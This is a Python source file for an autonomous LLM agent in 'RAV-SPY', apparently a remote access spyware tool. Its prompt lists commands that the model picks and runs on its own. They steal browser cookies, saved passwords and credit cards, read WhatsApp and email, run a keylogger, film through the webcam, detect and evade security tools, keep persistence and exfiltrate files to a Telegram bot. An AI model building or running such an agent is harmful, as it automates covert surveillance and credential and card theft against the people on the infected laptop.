"""
Autonomous Agent v2 — ReAct loop: observe, think, act, reflect.
Goal-oriented, self-correcting, multi-step execution with Telegram progress.
"""
import os
import re
import json
import asyncio
import httpx
from loguru import logger

MAX_STEPS = 15
MAX_RETRIES = 2

REACT_PROMPT = """Kamu adalah Autonomous Agent untuk RAV-SPY — remote laptop intelligence system.

GOAL: {goal}

Konteks sejauh ini:
{context}

Kamu harus memilih SATU tindakan berikutnya yang paling efektif untuk mencapai goal.

--- PERINTAH TERSEDIA ---
System & Info: !sysinfo, !battery, !brightness, !volume, !power, !process list, !top, !active, !ports, !wifi, !ping, !speedtest
Media & Capture: !screenshot, !video <detik>, !webcam, !webcamvid, !active
File: !ls [path], !find <pattern>, !get <path>, !cd <path>, !search_content, !recent, !organize, !backup
Terminal: !term (masuk mode terminal interaktif), !run <script>
Web & AI: !search <query>, !liveweb <query>, !web <query>, !scrape <url> <task>, !brain <query>
AI Tasks: !ai work <task>, !ai research <topic>, !ai summarize <target>, !ai insight, !ai write <type> <topic>
Memory: !memory search <query>, !memory summarize, !memory stats
Browser Intel: !steal cookies/passwords/cards/autofill/extensions, !browser_history history/bookmarks/downloads
WhatsApp: !wa check <nomor>, !wa messages <nomor>, !wa groups, !wa status
Social Spy: !social_spy detect/track/report
Email Spy: !email_spy recent/contacts
Network: !network, !scan, !deepscan, !browserspy, !exfil, !ai_recon
Stealth: !stealth on/off/status/detect/clean
Productivity: !todo, !task, !reminder, !note, !daily, !focus, !workspace
Persistence: !persistence status
Other: !sleep, !wake, !lock, !guard, !keylog status

--- FORMAT RESPON ---
Kamu harus merespon dengan JSON:
{{
  "thought": "analisis singkat situasi saat ini dan apa yang perlu dilakukan",
  "command": "!perintah <argumen>",
  "reason": "mengapa perintah ini dipilih"
}}

Jika goal SUDAH TERCAPAI, respon:
{{
  "thought": "penjelasan bahwa goal sudah tercapai",
  "command": "done",
  "summary": "ringkasan hasil yang dicapai"
}}

Jika goal TIDAK BISA dicapai:
{{
  "thought": "penjelasan mengapa tidak bisa",
  "command": "failed",
  "summary": "kendala yang dihadapi"
}}
"""


def _extract_tool_list() -> str:
    tools = [
        ("!screenshot [grid]", "Screenshot layar, bisa dengan grid koordinat"),
        ("!video [detik]", "Rekam layar (max 30 detik)"),
        ("!webcam", "Foto dari webcam"),
        ("!webcamvid [detik]", "Video dari webcam"),
        ("!sysinfo", "Info sistem: CPU, RAM, disk, OS"),
        ("!battery", "Status baterai"),
        ("!brightness [0-100]", "Atur/baca kecerahan layar"),
        ("!volume [app/global] [level]", "Kontrol volume"),
        ("!process list", "Daftar proses berjalan"),
        ("!top", "Proses paling boros resource"),
        ("!active", "Window/Laptop aktif saat ini"),
        ("!ls [path]", "List file di folder"),
        ("!find <pattern>", "Cari file rekursif"),
        ("!get <path>", "Download file ke HP"),
        ("!cd <path>", "Pindah direktori"),
        ("!search_content <keyword>", "Cari teks dalam file"),
        ("!recent [files/folders]", "File/folder terbaru"),
        ("!run <script>", "Jalankan script Python/bash"),
        ("!term", "Akses terminal interaktif"),
        ("!search <query>", "Cari di Google"),
        ("!web <query>", "Cari di web"),
        ("!liveweb <query>", "Web search real-time"),
        ("!scrape <url> <task>", "Web scraping + AI analysis"),
        ("!brain <query>", "Comprehensive web Q&A"),
        ("!ai work <task>", "AI productivity assistant"),
        ("!ai research <topic>", "Riset topik via AI"),
        ("!ai summarize <target>", "Ringkas file/folder"),
        ("!ai write <type> <topic>", "Buat draft dokumen/email"),
        ("!ai insight", "Analisis pola penggunaan laptop"),
        ("!memory search <query>", "Cari di long-term memory"),
        ("!memory summarize", "Ringkasan memory"),
        ("!steal all", "Browser stealer: semua data"),
        ("!steal cookies", "Cookie dari Chrome/Firefox"),
        ("!steal passwords", "Saved passwords"),
        ("!steal cards", "Credit cards"),
        ("!browser_history history [limit]", "Riwayat browsing"),
        ("!wa check <nomor>", "Cek status online WA"),
        ("!wa messages <nomor>", "Riwayat pesan WA"),
        ("!wa groups", "Daftar grup WA"),
        ("!social_spy detect", "Deteksi sosial media di window aktif"),
        ("!email_spy recent", "Email terbaru"),
        ("!network", "Info jaringan lengkap"),
        ("!ping [host]", "Cek koneksi jaringan"),
        ("!speedtest", "Tes kecepatan internet"),
        ("!exfil telegram <file>", "Kirim file intel ke Telegram"),
        ("!keylog status", "Cek status keylogger"),
        ("!stealth detect", "Scan EDR/security tools"),
        ("!stealth status", "Cek status stealth"),
        ("!todo list", "Daftar tugas"),
        ("!daily", "Laporan aktivitas harian"),
        ("!guard on/off", "Webcam motion detection"),
        ("!persistence status", "Cek persistence agent"),
    ]
    return "\n".join(f"• `{cmd}` — {desc}" for cmd, desc in tools)


class AutonomousAgent:
    def __init__(self):
        self.running = False
        self._api_key = os.environ.get("NVIDIA_NIM_API_KEY", "")
        self._base_url = os.environ.get("NVIDIA_NIM_BASE_URL", "https://integrate.api.nvidia.com/v1")
        self._model = os.environ.get("NVIDIA_NIM_MODEL", "meta/llama-3.1-70b-instruct")
        self._chat_id = os.environ.get("ALLOWED_USER_IDS", "").split(",")[0] if os.environ.get("ALLOWED_USER_IDS") else ""

    async def run(self, goal: str, user_id: str, router=None, handler=None) -> str:
        """Run agent with ReAct loop."""
        self.running = True
        context = []
        step = 0
        retries = 0

        await self._telegram(f"🤖 *Agent mulai*\nGoal: {goal}")

        try:
            while self.running and step < MAX_STEPS:
                step += 1
                ctx_text = "\n".join(context[-8:]) if context else "Belum ada eksekusi."
                prompt = REACT_PROMPT.format(goal=goal, context=ctx_text)

                decision = await self._llm_call(prompt)
                if not decision:
                    return "❌ Agent gagal: LLM tidak merespon dengan format yang benar."

                cmd = decision.get("command", "")
                thought = decision.get("thought", "")
                reason = decision.get("reason", "")

                if cmd == "done":
                    summary = decision.get("summary", "Goal tercapai.")
                    report = self._build_report(goal, context, summary, step - 1)
                    await self._telegram(f"✅ *Goal tercapai!*\n{summary[:200]}")
                    return report

                if cmd == "failed":
                    summary = decision.get("summary", "Goal tidak bisa dicapai.")
                    report = self._build_report(goal, context, f"❌ Gagal: {summary}", step - 1)
                    await self._telegram(f"❌ *Agent gagal*\n{summary[:200]}")
                    return report

                if not cmd or not cmd.startswith("!"):
                    context.append(f"Step {step}: LLM returned invalid command: {cmd}")
                    continue

                await self._telegram(f"⏳ *Step {step}*: {reason}\n`{cmd}`")
                context.append(f"Step {step}: {reason}\nPerintah: {cmd}")

                result = await self._execute(cmd, router, handler, retries)
                result_str = self._format_result(result)
                context.append(f"Hasil: {result_str[:500]}")

                if "error" in result_str.lower() or "❌" in result_str:
                    retries += 1
                    if retries > MAX_RETRIES:
                        context.append(f"⚠ Retries exhausted ({MAX_RETRIES}), melanjutkan ke langkah berikutnya.")
                else:
                    retries = 0

                await self._telegram(f"  {result_str[:200]}")

            if not self.running:
                report = self._build_report(goal, context, "⏹ Dihentikan user.", step)
                return report

            report = self._build_report(goal, context, f"⚠ Mencapai batas maksimal ({MAX_STEPS} langkah).", step)
            await self._telegram(f"⚠ Agent stop: maksimal {MAX_STEPS} langkah tercapai.")
            return report

        finally:
            self.running = False
            try:
                from agent.memory.manager import memory_manager
                memory_manager.remember(
                    f"Autonomous agent completed goal: {goal}",
                    source="autonomous_agent",
                    topic="agent_execution",
                    tags=["autonomous", "agent"],
                )
            except Exception:
                pass

    def stop(self):
        self.running = False

    def _build_report(self, goal: str, context: list, summary: str, steps: int) -> str:
        lines = [
            f"🤖 *Autonomous Agent Report*",
            f"Goal: {goal}",
            f"Status: {summary}",
            f"Steps: {steps}",
            "",
        ]
        for entry in context:
            lines.append(entry[:200])
        return "\n".join(lines)

    async def _execute(self, cmd: str, router, handler, retries: int) -> str:
        if router:
            try:
                result = await router.route(cmd, self._chat_id or "user")
                return result if isinstance(result, str) else str(result)
            except Exception as e:
                return f"❌ Error: {e}"

        if handler:
            try:
                result = await handler.handle_command(cmd, self._chat_id or "user")
                return result if isinstance(result, str) else str(result)
            except Exception as e:
                return f"❌ Error: {e}"

        return "❌ No router or handler available."

    def _format_result(self, result) -> str:
        if isinstance(result, str):
            return result[:500]
        if isinstance(result, dict):
            return json.dumps(result, indent=2, default=str)[:500]
        return str(result)[:500]

    async def _llm_call(self, prompt: str) -> dict | None:
        if not self._api_key:
            logger.error("NVIDIA_NIM_API_KEY not set")
            return {"command": "failed", "summary": "API key tidak tersedia."}
        for attempt in range(3):
            try:
                async with httpx.AsyncClient(timeout=90) as client:
                    resp = await client.post(
                        f"{self._base_url}/chat/completions",
                        headers={"Authorization": f"Bearer {self._api_key}", "Content-Type": "application/json"},
                        json={
                            "model": self._model,
                            "messages": [{"role": "system", "content": "Kamu adalah autonomous agent planner. Selalu respon dengan JSON."}, {"role": "user", "content": prompt}],
                            "max_tokens": 1024,
                            "temperature": 0.3,
                        },
                    )
                    resp.raise_for_status()
                    raw = resp.json()["choices"][0]["message"]["content"]
                    json_match = re.search(r'```(?:json)?\s*\n?(.*?)\n?```', raw, re.DOTALL)
                    if json_match:
                        return json.loads(json_match.group(1))
                    return json.loads(raw)
            except (json.JSONDecodeError, KeyError, httpx.HTTPError) as e:
                logger.warning(f"LLM call attempt {attempt + 1}: {e}")
                await asyncio.sleep(1)
        return None

    async def _telegram(self, text: str):
        token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
        if not token or not self._chat_id:
            return
        try:
            async with httpx.AsyncClient(timeout=15) as client:
                await client.post(
                    f"https://api.telegram.org/bot{token}/sendMessage",
                    json={"chat_id": self._chat_id, "text": text},
                )
        except Exception as e:
            logger.error(f"Telegram: {e}")


autonomous_agent = AutonomousAgent()
